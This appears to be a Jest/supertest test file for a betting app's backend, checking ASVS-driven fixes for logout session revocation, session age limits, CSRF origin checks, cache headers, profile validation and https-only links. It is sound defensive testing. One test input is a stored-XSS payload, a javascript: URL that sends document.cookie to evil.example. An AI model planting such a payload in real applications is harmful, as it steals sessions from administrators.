const request = require('supertest');
const app = require('../../server/app');
const { resetDatabase, prisma } = require('../helpers/reset');
const env = require('../../server/config/env');
const password = require('../../server/utils/password');
const { generate: totpGenerate } = require('@otplib/totp');
const { base32Plugin, cryptoPlugin } = require('../../server/utils/totpPlugins');

// Fixes from the internal ASVS L2 review (TASK-036): session revocation
// on logout, CSRF origin check, no caching of API responses, profile
// input validation, and https-only user-supplied links.

let counter = 0;
async function registeredBetter() {
  counter += 1;
  const agent = request.agent(app);
  const res = await agent
    .post('/api/auth/register/better')
    .send({ fullName: 'Hardening Test', phone: `0941000000${counter}`, pin: '1234' });
  return { agent, userId: res.body.user.id, cookies: res.headers['set-cookie'] };
}

beforeEach(async () => {
  await resetDatabase();
});

afterAll(async () => {
  await prisma.$disconnect();
});

describe('Logout revokes the session server-side (ASVS 3.3.1)', () => {
  it('a copied session cookie stops working the moment the owner logs out', async () => {
    const { agent, cookies } = await registeredBetter();
    expect((await request(app).get('/api/users/me').set('Cookie', cookies)).status).toBe(200);

    await agent.post('/api/auth/logout');

    expect((await request(app).get('/api/users/me').set('Cookie', cookies)).status).toBe(401);
    expect((await request(app).post('/api/auth/refresh').set('Cookie', cookies)).status).toBe(401);
  });

  it('logging out with no session is still a harmless 200', async () => {
    expect((await request(app).post('/api/auth/logout')).status).toBe(200);
  });

  it('turning MFA on keeps this device signed in but signs out every other device', async () => {
    const phone = '09430000001';
    await prisma.user.create({
      data: { role: 'ADMIN', staffRole: 'SUPER_ADMIN', fullName: 'Staff', phone, passwordHash: await password.hash('1234') },
    });
    const thisDevice = request.agent(app);
    const otherDevice = request.agent(app);
    await thisDevice.post('/api/auth/login').send({ phone, pin: '1234' });
    await otherDevice.post('/api/auth/login').send({ phone, pin: '1234' });

    const { body: setup } = await thisDevice.post('/api/auth/mfa/setup');
    const code = await totpGenerate({ secret: setup.secret, crypto: cryptoPlugin, base32: base32Plugin });
    expect((await thisDevice.post('/api/auth/mfa/setup/confirm').send({ code })).status).toBe(200);

    expect((await thisDevice.get('/api/users/me')).status).toBe(200);
    expect((await otherDevice.get('/api/users/me')).status).toBe(401);
    expect((await otherDevice.post('/api/auth/refresh')).status).toBe(401);
  });
});

describe('Sessions have a maximum age, however often they refresh (ASVS 3.3.2)', () => {
  const jwt = require('jsonwebtoken');
  const hoursAgo = (h) => Math.floor(Date.now() / 1000) - h * 3600;

  async function refreshWith(user, claims) {
    const token = jwt.sign({ sub: user.id, tv: user.tokenVersion, ...claims }, env.jwt.refreshSecret, { expiresIn: '7d' });
    return request(app).post('/api/auth/refresh').set('Cookie', [`sb_refresh=${token}`]);
  }

  async function makeUser(role, phone) {
    return prisma.user.create({ data: { role, fullName: 'Age Test', phone, passwordHash: 'x' } });
  }

  it('bettors re-login after 30 days, even with a freshly rotated refresh token', async () => {
    const user = await makeUser('BETTER', '09450000001');
    expect((await refreshWith(user, { at: hoursAgo(29 * 24) })).status).toBe(200);
    expect((await refreshWith(user, { at: hoursAgo(31 * 24) })).status).toBe(401);
  });

  it('staff re-login after 12 hours', async () => {
    const user = await makeUser('ADMIN', '09450000002');
    expect((await refreshWith(user, { at: hoursAgo(11) })).status).toBe(200);
    expect((await refreshWith(user, { at: hoursAgo(13) })).status).toBe(401);
  });

  it('refreshing keeps the ORIGINAL login time, so rotation cannot extend a session', async () => {
    const user = await makeUser('ADMIN', '09450000003');
    const loginTime = hoursAgo(11);
    const res = await refreshWith(user, { at: loginTime });
    const rotated = res.headers['set-cookie'].find((c) => c.startsWith('sb_refresh=')).split(';')[0].split('=')[1];
    expect(jwt.decode(rotated).at).toBe(loginTime);
  });

  it('rejects refresh tokens issued before login times were recorded', async () => {
    const user = await makeUser('BETTER', '09450000004');
    expect((await refreshWith(user, {})).status).toBe(401);
  });
});

describe('CSRF: state-changing requests from a foreign origin are refused (ASVS 13.2.3)', () => {
  it('blocks a cross-site POST even with a valid session cookie', async () => {
    const { cookies } = await registeredBetter();
    const res = await request(app)
      .post('/api/deposits/demo')
      .set('Cookie', cookies)
      .set('Origin', 'https://evil.example')
      .send({ amount: 1000 });
    expect(res.status).toBe(403);
  });

  it('allows the real client origin and requests with no Origin header', async () => {
    const { cookies } = await registeredBetter();
    const fromClient = await request(app)
      .post('/api/deposits/demo')
      .set('Cookie', cookies)
      .set('Origin', env.clientOrigin)
      .send({ amount: 1000 });
    expect(fromClient.status).toBe(201);

    const noOrigin = await request(app).post('/api/deposits/demo').set('Cookie', cookies).send({ amount: 1000 });
    expect(noOrigin.status).toBe(201);
  });

  it('does not block reads from other origins (CORS already governs those)', async () => {
    const res = await request(app).get('/api/competitions').set('Origin', 'https://evil.example');
    expect(res.status).toBe(200);
  });
});

describe('API responses are never cached (ASVS 8.2.1)', () => {
  it('sends Cache-Control: no-store on API responses', async () => {
    const { agent } = await registeredBetter();
    const res = await agent.get('/api/wallet/me');
    expect(res.headers['cache-control']).toBe('no-store');
  });
});

describe('Profile updates are validated and name changes audited', () => {
  it('rejects an empty name and a malformed email', async () => {
    const { agent } = await registeredBetter();
    expect((await agent.patch('/api/users/me').send({ fullName: ' ' })).status).toBe(422);
    expect((await agent.patch('/api/users/me').send({ email: 'not-an-email' })).status).toBe(422);
    expect((await agent.patch('/api/users/me').send({ fullName: 'x'.repeat(101) })).status).toBe(422);
  });

  it('records a name change in the audit log, since insider-betting checks match on names', async () => {
    const { agent, userId } = await registeredBetter();
    const res = await agent.patch('/api/users/me').send({ fullName: 'New Name' });
    expect(res.status).toBe(200);

    const logs = await prisma.auditLog.findMany({ where: { action: 'PROFILE_NAME_CHANGED', entityId: userId } });
    expect(logs).toHaveLength(1);
    expect(logs[0].beforeState).toEqual({ fullName: 'Hardening Test' });
    expect(logs[0].afterState).toEqual({ fullName: 'New Name' });
  });
});

describe('User-supplied links must be https (ASVS 5.1.3)', () => {
  it('rejects a javascript: KYC document link that would be stored XSS against admins', async () => {
    const res = await request(app).post('/api/auth/register/boardman').send({
      fullName: 'Link Test',
      phone: '09420000001',
      pin: '1234',
      businessLocation: 'Lagos',
      kycDocumentUrl: 'javascript:fetch("https://evil.example/?c="+document.cookie)',
    });
    expect(res.status).toBe(422);
    expect(res.body.error).toMatch(/https/);
  });

  it('accepts an ordinary https link', async () => {
    const res = await request(app).post('/api/auth/register/boardman').send({
      fullName: 'Link Test',
      phone: '09420000002',
      pin: '1234',
      businessLocation: 'Lagos',
      kycDocumentUrl: 'https://storage.example.com/kyc/doc.pdf',
    });
    expect(res.status).toBe(201);
  });
});
